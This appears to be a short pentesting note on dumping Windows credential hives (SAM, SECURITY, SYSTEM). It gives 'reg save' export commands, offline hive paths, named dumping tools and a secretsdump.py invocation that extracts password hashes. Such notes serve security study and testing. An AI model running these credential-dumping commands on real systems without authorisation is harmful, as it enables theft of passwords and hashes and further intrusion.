<h1>SAM</h1>
<p>In Windows environments, passwords are stored in a hashed format in registry hives like SAM (Security Account Manager) and SECURITY.</p>
<p><b>SAM: </b>Stores locally cached credentials (referred to as SAM secrets). It stores LM or NT hashes. </p>
<p><b>SECURITY: </b>Stores domain cached credentials (referred to as LSA secrets). Plaintext passwords LM or NT hashes Kerberos keys (DES, AES)
Domain Cached Credentials (DCC1 and DCC2).</p>
<p><b>SYSTEM: </b>contains enough info to decrypt SAM secrets and LSA secrets</p>

<h4>Exfiltration</h4>
<p>When the windows is up and running, the hives are mounted and the command line tool <b>reg</b> can be used to export them.<br><b>hive: A hive is a logical group of keys, subkeys, and values in the registry</b></p>
<code>reg save HKLM\SAM 'C:\Windows\Temp\sam.save'</code> <br>
<code>reg save HKLM\SECURITY 'C:\Windows\Temp\security.save' </code> <br>
<code>reg save HKLM\SYSTEM 'C:\Windows\Temp\system.save</code>

<p>Things get interesting when the system ins't on. They can be simply copied from the hard-disk</p>
<code>\system32\config\sam</code><br>
<code>\system32\config\security</code><br>
<code>\system32\config\system</code>

<p><b>There are other tools too that can be used for local/remote/offline dumping.</b></p>
<ul>
  <li>secretsdump: Let's you dump SAM and LSA files either remotely or locally.</li>
  <li>CrackMapExec: Let's you dump SAM files remotely.</li>
  <li>Mimikatz: Let's you locally extract credentials from SAM and SECURITY.</li>
</ul>

<h4>How to get hashes using secretdump.py (impacket)/</h4>
<p>Run the follwoing commands, as you'll be needing the sam, security and system keys to run secretdump.py.</p>
<code> C:\> reg.exe save hklm\sam c:\temp\sam.save </code><br>
  <code> C:\> reg.exe save hklm\security c:\temp\security.save </code><br>
  <code> C:\> reg.exe save hklm\system c:\temp\system.save </code>
  
<p>Then finally run the following commands: <b>secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</b></p>
